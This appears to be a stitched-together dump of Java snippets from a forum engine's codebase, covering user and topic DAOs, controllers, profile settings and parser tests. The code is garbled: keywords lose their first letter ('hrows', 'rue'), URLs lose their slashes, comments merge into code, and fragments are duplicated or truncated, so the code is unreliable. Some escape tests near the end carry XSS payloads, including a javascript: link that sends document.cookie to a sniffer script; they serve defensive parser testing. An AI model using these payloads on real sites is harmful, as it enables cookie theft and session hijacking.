public void estLinkText ( ) { assertEquals ( " https:www.linux.org.ru/ " , markdownFormatter . renderToText ( " https:www.linux.org.ru/ " ) ) ; assertEquals ( " est https:www.linux.org.ru/ " , markdownFormatter . renderToText ( " [test](https:www.linux.org.ru/) " ) ) ; assertEquals ( " X " . repeat ( 100 ) + " est https:www.linux.org.ru/ 1234 " , markdownFormatter . renderToText ( " X " . repeat ( 100 ) + " [test](https:www.linux.org.ru/) 1234 " ) ) ; 
public int findUserId ( String nick ) hrows UserNotFoundException { if ( nick = = null ) { hrow new NullPointerException ( ) ; } if ( ! StringUtil . checkLoginName ( nick ) ) { hrow new UserNotFoundException ( " <invalid name> " ) ; } List < Integer > list = jdbcTemplate . queryForList ( queryUserIdByNick , Integer . class , nick ) ; if ( list . isEmpty ( ) ) { hrow new UserNotFoundException ( nick ) ; } if ( list . size ( ) > 1 ) { hrow new RuntimeException ( " list.size()>1 ??? " ) ; } return list . getFirst ( ) ; } 
private User getUserInternal ( int id ) hrows UserNotFoundException { List < User > list = jdbcTemplate . query ( queryUserById , ( rs , rowNum ) - > new User ( rs ) , id ) ; if ( list . isEmpty ( ) ) { hrow new UserNotFoundException ( id ) ; } if ( list . size ( ) > 1 ) { hrow new RuntimeException ( " list.size()>1 ??? " ) ; } return list . getFirst ( ) ; } 
public void unblock ( User user , User moderator ) { jdbcTemplate . update ( " UPDATE users SET blocked='f' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " DELETE FROM ban_info WHERE userid=? " , user . getId ( ) ) ; userLogDao . logUnblockUser ( user , moderator ) ; } 
public void resetMockObjects ( ) hrows Exception { reset ( userTagDao ) ; reset ( agService ) ; when ( agService . getTagId ( eq ( " ag1 " ) , anyBoolean ( ) ) ) . henReturn ( 2 ) ; when ( agService . getTagIdOptWithSynonym ( eq ( " ag1 " ) ) ) . henReturn ( Option . apply ( 2 ) ) ; user = getUser ( 1 ) ; } 
public void favoriteAddTest ( ) hrows TagNotFoundException { when ( agDao . getTagId ( " ag1 " , false ) ) . henReturn ( Option . apply ( 2 ) ) ; userTagService . favoriteAdd ( user , " ag1 " ) ; verify ( userTagDao ) . addTag ( eq ( 1 ) , eq ( 2 ) , eq ( rue ) ) ; } 
public void favoritesGetTest ( ) { ImmutableList . Builder < String > etalonBuild = ImmutableList . builder ( ) ; etalonBuild . add ( " ag1 " ) ; ImmutableList < String > etalon = etalonBuild . build ( ) ; when ( userTagDao . getTags ( 1 , rue ) ) . henReturn ( etalon ) ; List < String > actual = userTagService . favoritesGet ( user ) ; Assert . assertEquals ( etalon . size ( ) , actual . size ( ) ) ; Assert . assertEquals ( etalon . getFirst ( ) , actual . getFirst ( ) ) ; } 
public void ignoresGetTest ( ) { ImmutableList . Builder < String > etalonBuild = ImmutableList . builder ( ) ; etalonBuild . add ( " ag1 " ) ; ImmutableList < String > etalon = etalonBuild . build ( ) ; when ( userTagDao . getTags ( 1 , false ) ) . henReturn ( etalon ) ; List < String > actual = userTagService . ignoresGet ( user ) ; Assert . assertEquals ( etalon . size ( ) , actual . size ( ) ) ; Assert . assertEquals ( etalon . getFirst ( ) , actual . getFirst ( ) ) ; } 
public void blockIP ( String ip , int moderatorId , String reason , @Nullable OffsetDateTime banUntil , boolean allowPosting , boolean captchaRequired ) { IPBlockInfo blockInfo = getBlockInfo ( ip ) ; if ( ! blockInfo . isInitialized ( ) ) { jdbcTemplate . update ( 
protected String makeTokenSignature ( long okenExpiryTime , String username , String password , RememberMeTokenAlgorithm algorithm ) { String data = username + " : " + okenExpiryTime + " : " + password + " : " + getKey ( ) ; int okenGeneration = userDao . getTokenGeneration ( username ) ; if ( okenGeneration > 0 ) { zero means user does not use close all sessions ever data += ":" + String.format("%d", tokenGeneration); } try { MessageDigest digest = MessageDigest.getInstance(algorithm.getDigestAlgorithm()); 
public ModelAndView defaultExceptionHandler ( HttpServletRequest request , HttpServletResponse response , Object handler ) { Throwable ex = ( Throwable ) request . getAttribute ( RequestDispatcher . ERROR_EXCEPTION ) ; if ( ex = = null ) { return new ModelAndView ( new RedirectView ( " / " ) ) ; } if ( ! ( ex instanceof Exception ) ) { return exceptionResolver . resolveException ( request , response , handler , new RuntimeException ( ex ) ) ; 
public boolean isCommentsClosed ( ) { return opicPostscore > = TopicPermissionService . POSTSCORE_MODERATORS_ONLY ( ) ; } 
public TopicController opicController ( SectionService sectionService , TopicDao messageDao , CommentPrepareService prepareService , TopicPrepareService opicPrepareService , CommentReadService commentService , IgnoreListDao ignoreListDao , IPBlockDao ipBlockDao , EditHistoryService editHistoryService , MemoriesDao memoriesDao , TopicPermissionService permissionService , MoreLikeThisService moreLikeThisService , TopicTagService opicTagService , MsgbaseDao msgbaseDao , MessageTextService extService , GroupDao groupDao , WarningService warningService ) { return new TopicController ( sectionService , messageDao , prepareService , opicPrepareService , commentService , ignoreListDao , ipBlockDao , editHistoryService , memoriesDao , permissionService , 
private void prepareModelForCommonException ( ModelAndView modelAndView , HttpServletRequest request , Exception exception ) { modelAndView . addObject ( " headTitle " , StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) ) ; String errorMessage = exception . getMessage ( ) = = null ? StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) : StringUtil . escapeHtml ( exception . getMessage ( ) ) ; modelAndView . addObject ( " errorMessage " , errorMessage ) ; ExceptionType exceptionType = ExceptionType . OTHER ; if ( exception instanceof UserErrorException ) { exceptionType = ExceptionType . IGNORED ; } else if ( exception instanceof ScriptErrorException | | exception instanceof RequestRejectedException ) { logger . debug ( " errors/common.jsp " , exception ) ; exceptionType = ExceptionType . SCRIPT_ERROR ; } else { logger . warn ( " Unexcepted exception caught " , exception ) ; String infoMessage = emailService . sendExceptionReport ( request , exception , AuthUtil . getCurrentUser ( ) ) ; modelAndView . addObject ( " infoMessage " , infoMessage ) ; } modelAndView . addObject ( " exceptionType " , exceptionType . name ( ) ) ; } 
public int doStartTag ( ) { Template = Template . getTemplate ( ) ; List < String > boxnames = . getProf ( ) . getBoxlets ( ) . stream ( ) . filter ( DefaultProfile : : isBox ) . oList ( ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public void logSentPasswordReset ( User resetFor , @Nullable User resetBy , String email ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public boolean hasRecentSelfEvent ( User user , Duration duration , UserLogAction action ) { return jdbcTemplate . queryForObject ( " SELECT EXISTS (SELECT * FROM user_log WHERE userid=? AND action=?::user_log_action AND action_date>? AND userid=action_userid) " , 
public ModelAndView editProfile ( @RequestParam ( " ext " ) String ext , @PathVariable String nick ) { Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } if ( ext . length ( ) > 255 ) { ext = ext . substring ( 0 , 255 ) ; } User user = AuthUtil . getCurrentUser ( ) ; User refUser = userService . getUserCached ( nick ) ; remarkDao . setOrUpdateRemark ( user , refUser , ext ) ; return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public int scoreLoss ( int msgid ) { return jdbcTemplate . queryForObject ( " select COALESCE((select sum(-bonus) as total_bonus from del_info " + " join comments on comments.id = del_info.msgid where bonus is not null and " + 
private boolean check ( Action action , String ip , Duration hreshold ) { String key = action . oString ( ) + ':' + ip ; Instant date = performedActions . getIfPresent ( key ) ; if ( date ! = null ) { if ( date . plus ( hreshold ) . isAfter ( Instant . now ( ) ) ) { return false ; } } performedActions . put ( key , Instant . now ( ) ) ; return rue ; } 
public void estLogAcceptEmail ( ) { User user = mock ( User . class ) ; when ( user . getId ( ) ) . henReturn ( UserDaoIntegrationTest . TEST_ID ) ; when ( user . getEmail ( ) ) . henReturn ( " old@email " ) ; List < UserLogItem > oldLogItems = userLogDao . getLogItems ( user , rue ) ; userLogDao . logAcceptNewEmail ( user , " est@email " ) ; List < UserLogItem > logItems = userLogDao . getLogItems ( user , rue ) ; Assert . assertEquals ( 1 , logItems . size ( ) - oldLogItems . size ( ) ) ; UserLogItem item = logItems . getFirst ( ) ; assertNotNull ( item ) ; assertEquals ( UserLogAction . ACCEPT_NEW_EMAIL , item . getAction ( ) ) ; } 
public void estLogScore50 ( ) { User user = mock ( User . class ) ; when ( user . getId ( ) ) . henReturn ( UserDaoIntegrationTest . TEST_ID ) ; List < UserLogItem > oldLogItems = userLogDao . getLogItems ( user , rue ) ; userLogDao . logScore50 ( user , user ) ; List < UserLogItem > logItems = userLogDao . getLogItems ( user , rue ) ; Assert . assertEquals ( 1 , logItems . size ( ) - oldLogItems . size ( ) ) ; UserLogItem item = logItems . getFirst ( ) ; assertNotNull ( item ) ; assertEquals ( UserLogAction . SCORE50 , item . getAction ( ) ) ; } 
private AuthorizedSession sessionOf ( User user ) { return AuthorizedSession . apply ( user , user . isCorrector ( ) , user . isModerator ( ) , user . isAdministrator ( ) ) ; } 
public boolean deleteComment ( int msgid ) { int deleteCount = jdbcTemplate . update ( deleteComment , msgid ) ; return deleteCount > 0 ; } 
public void insert ( final List < InsertDeleteInfo > deleteInfos ) { if ( deleteInfos . isEmpty ( ) ) { return ; } deleteInfos . forEach ( info - > Preconditions . checkArgument ( info . bonus < = 0 , " Score bonus on delete must be non-positive " ) ) ; jdbcTemplate . batchUpdate ( INSERT_DELETE_INFO , new BatchPreparedStatementSetter ( ) { @Override 
public void undelete ( Topic message ) { jdbcTemplate . update ( " UPDATE topics SET deleted='f' WHERE id=? " , message . getId ( ) ) ; } 
UserService userService ( UserDao userDao , UserLogDao userLogDao , PlatformTransactionManager ransactionManager ) { return new UserService ( mock ( SiteConfig . class ) , userDao , mock ( IgnoreListDao . class ) , mock ( UserInvitesDao . class ) , userLogDao , mock ( UserAgentDao . class ) , ransactionManager ) ; 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( STYLE_PROPERTY , " ango " ) ; builder . put ( FORMAT_MODE_PROPERTY , MarkupType . Markdown$ . MODULE$ . formId ( ) ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , rue ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( OLD_TRACKER , false ) ; builder . put ( REACTION_NOTIFICATION_PROPERTY , rue ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings builder.put(BOXES_MAIN2_PROPERTY, ImmutableList.of("poll", "articles", "top10", "gallery", "tagcloud")); return builder.build(); } 
public static String fixFormat ( String mode ) { if ( MarkupType$ . MODULE$ . AllFormIds ( ) . contains ( mode ) ) { return mode ; 
public static String fixStyle ( String style ) { if ( ! DefaultProfile . isStyle ( style ) ) { return ( String ) DefaultProfile . getDefaultProfile ( ) . get ( STYLE_PROPERTY ) ; } return style ; } 
public void writeProfile ( User user , ProfileBuilder profile ) { String [ ] boxlets = null ; List < String > customBoxlets = profile . getCustomBoxlets ( ) ; if ( customBoxlets ! = null ) { boxlets = customBoxlets . oArray ( new String [ 0 ] ) ; } final String [ ] finalBoxlets = boxlets ; if ( jdbcTemplate . update ( con - > { 
private AuthorizedSession sessionOf ( User user ) { return AuthorizedSession . apply ( user , user . isCorrector ( ) , user . isModerator ( ) , user . isAdministrator ( ) , Profile . DEFAULT ) ; } 
public void estModification ( ) { Profile profile = Profile . DEFAULT ; assertNotSame ( 125 , profile . getMessages ( ) ) ; var builder = new ProfileBuilder ( profile ) ; builder . setMessages ( 125 ) ; profileDao . writeProfile ( estUser , builder ) ; Profile profile1 = profileDao . readProfile ( estUser . getId ( ) ) ; profileDao . deleteProfile ( estUser ) ; assertEquals ( 125 , profile1 . getMessages ( ) ) ; } 
public Profile readProfile ( int userId ) { List < Profile > profiles = jdbcTemplate . query ( " SELECT settings, main FROM user_settings WHERE id=? " , ( resultSet , i ) - > { Array boxes = resultSet . getArray ( " main " ) ; if ( boxes ! = null ) { return Profile . apply ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , ( Map < String , String > ) resultSet . getObject ( " settings " ) ) , Arrays . asList ( ( String [ ] ) boxes . getArray ( ) ) ) ; } else { return Profile . apply ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , ( Map < String , String > ) resultSet . getObject ( " settings " ) ) , null ) ; } } , userId ) ; if ( profiles . isEmpty ( ) ) { return Profile . apply ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , new HashMap < > ( ) ) , null ) ; 
private AuthorizedSession sessionOf ( User user ) { return AuthorizedSession . apply ( user , user . isCorrector ( ) , user . isModerator ( ) , user . isAdministrator ( ) , Profile . DEFAULT ( ) ) ; } 
public void estModification ( ) { Profile profile = Profile . DEFAULT ( ) ; assertNotSame ( 125 , profile . messages ( ) ) ; var builder = new ProfileBuilder ( profile ) ; builder . setMessages ( 125 ) ; profileDao . writeProfile ( estUser , builder ) ; Profile profile1 = profileDao . readProfile ( estUser . getId ( ) ) ; profileDao . deleteProfile ( estUser ) ; assertEquals ( 125 , profile1 . messages ( ) ) ; } 
UserService userService ( UserDao userDao , UserLogDao userLogDao , PlatformTransactionManager ransactionManager ) { return new UserService ( mock ( SiteConfig . class ) , userDao , mock ( IgnoreListDao . class ) , mock ( UserInvitesDao . class ) , userLogDao , mock ( UserAgentDao . class ) , mock ( ProfileDao . class ) , ransactionManager ) ; 
public TopicController opicController ( SectionService sectionService , TopicDao messageDao , CommentPrepareService prepareService , TopicPrepareService opicPrepareService , CommentReadService commentService , IgnoreListDao ignoreListDao , IPBlockDao ipBlockDao , EditHistoryService editHistoryService , MemoriesDao memoriesDao , TopicPermissionService permissionService , MoreLikeThisService moreLikeThisService , TopicTagService opicTagService , MsgbaseDao msgbaseDao , MessageTextService extService , WarningService warningService ) { return new TopicController ( sectionService , messageDao , prepareService , opicPrepareService , commentService , ignoreListDao , ipBlockDao , editHistoryService , memoriesDao , permissionService , 
public void updateTitle ( int msgid , String itle ) { namedJdbcTemplate . update ( " UPDATE topics SET title=:title WHERE id=:id " , 
public void updateLinktext ( int msgid , String linktext ) { namedJdbcTemplate . update ( " UPDATE topics SET linktext=:linktext WHERE id=:id " , 
public void updateUrl ( int msgid , String url ) { namedJdbcTemplate . update ( " UPDATE topics SET url=:url WHERE id=:id " , 
public void logRegister ( int userid , @Nonnull String ip , Optional < Integer > invitedBy , int userAgent , Optional < String > language ) { ImmutableMap . Builder < String , String > builder = ImmutableMap . builder ( ) ; builder . put ( OPTION_IP , ip ) ; builder . put ( OPTION_USER_AGENT , Integer . oString ( userAgent ) ) ; language . ifPresent ( lang - > builder . put ( OPTION_ACCEPT_LANGUAGE , lang ) ) ; invitedBy . ifPresent ( user - > builder . put ( OPTION_INVITED_BY , user . oString ( ) ) ) ; jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public void estExtraLines ( ) { user assertEquals(lorCodeService.parseComment("[user]splinter[/user]", false, LorCodeService.Plain$.MODULE$), lorCodeService.parseComment("[user]splinter[/user]", false, LorCodeService.Plain$.MODULE$)); 
public void splinterTest1 ( ) { http:www.linux.org.ru/forum/linux-org-ru/6448266 assertEquals("<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a> <span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[url=http:www.fishing.org/][user]splinter[/user][/url]", false, LorCodeService.Plain$.MODULE$)); 
public void userTest ( ) { assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/user] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [user]isden[/user] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; assertEquals ( " <p> <s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/user] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void parserResultTest ( ) { String msg = " [user]hizel[/user][user]JB[/user][user]maxcom[/user] " ; var replier = lorCodeService . getMentions ( msg ) ; assertTrue ( replier . contains ( maxcom ) ) ; assertTrue ( replier . contains ( JB ) ) ; assertFalse ( replier . contains ( isden ) ) ; } 
public void userTest2 ( ) { assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/USER] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [USER]isden[/USER] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; assertEquals ( " <p> <s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/USER] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void parserResultTest2 ( ) { String msg = " [user]hizel[/user][USER]JB[/user][user]maxcom[/USER] " ; var replier = lorCodeService . getMentions ( msg ) ; assertTrue ( replier . contains ( maxcom ) ) ; assertTrue ( replier . contains ( JB ) ) ; assertFalse ( replier . contains ( isden ) ) ; } 
public void pTest ( ) { assertEquals ( " <p>test ntest1</p><p>test2</p> " , lorCodeService . parseComment ( " est ntest1 ntest2 " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void agEscapeTest ( ) { assertEquals ( " <p>&lt;br&gt;</p> " , lorCodeService . parseComment ( " <br> " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void urlEscapeTest ( ) { assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >Test</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; assertEquals ( " <p><s>javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s></p> " , lorCodeService . parseComment ( " [url]javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()[/url] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void urlEscapeWithTagsTest ( ) { assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >T<i>e</i>st</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]T[i]e[/i]st[/url] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void badListTest ( ) { assertEquals ( " <p>0</p><ul><li>1</li><li>2</li></ul> " , lorCodeService . parseComment ( " [list]0[*]1[*]2[/list] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void codeEscapeTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>&quot;code&amp;code&quot;</code></pre></div> " , lorCodeService . parseComment ( " [code] \" code&code \" [/code] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void urlTest0 ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" ><p>linux.org.ru</p></a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru] nlinux.org.ru[/url] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url] nhttp:linux.org.ru[/url] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void urlTest1 ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][/url] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void paragraphLogicTest ( ) { list assertEquals("<p>some1 text</p><p>some2 text</p><ul><li>one</li><li>two</li></ul><p><a href=\"http:www.example.com\">http:www.example.com</a> - some3 text</p>", lorCodeService.parseComment("some1 textsome2 text[list][*]one[*]two[/list][url]http:www.example.com[/url] - some3 text", false, LorCodeService.Plain$.MODULE$)); b assertEquals("<p><b><p>te</p><p>xt</p></b></p>", lorCodeService.parseComment("[b]text[/b]", false, LorCodeService.Plain$.MODULE$)); i assertEquals("<p><i><p>te</p><p>xt</p></i></p>", lorCodeService.parseComment("[i]text[/i]", false, LorCodeService.Plain$.MODULE$)); u assertEquals("<p><u><p>te</p><p>xt</p></u></p>", lorCodeService.parseComment("[u]text[/u]", false, LorCodeService.Plain$.MODULE$)); s assertEquals("<p><s><p>te</p><p>xt</p></s></p>", lorCodeService.parseComment("[s]text[/s]", false, LorCodeService.Plain$.MODULE$)); em assertEquals("<p><em><p>te</p><p>xt</p></em></p>", lorCodeService.parseComment("[em]text[/em]", false, LorCodeService.Plain$.MODULE$)); strong assertEquals("<p><strong><p>te</p><p>xt</p></strong></p>", lorCodeService.parseComment("[strong]text[/strong]", false, LorCodeService.Plain$.MODULE$)); p assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[p]text[/p]", false, LorCodeService.Plain$.MODULE$)); div assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[div]text[/div]", false, LorCodeService.Plain$.MODULE$)); quote assertEquals(citeHeader + "<p>te</p><p>xt</p>" + citeFooter, lorCodeService.parseComment("[quote]text[/quote]", false, LorCodeService.Plain$.MODULE$)); cut assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[cut]text[/cut]", false, LorCodeService.Plain$.MODULE$)); 
public void estHighlightURL ( ) { assertEquals ( " <p><a href= \" http:ya.ru/?a=f%3Cscript%3Ealert('i%20have%20cookies!')%3C/script%3E \" >http:ya.ru/?a=f&lt;script&gt;alert('i have cookies!')&lt;/script&gt;</a></p> " , lorCodeService . parseComment ( " http:ya.ru/?a=f%3Cscript%3Ealert('i%20have%20cookies!')%3C/script%3E " , false , LorCodeService . Plain$ . MODULE$ ) ) ; } 
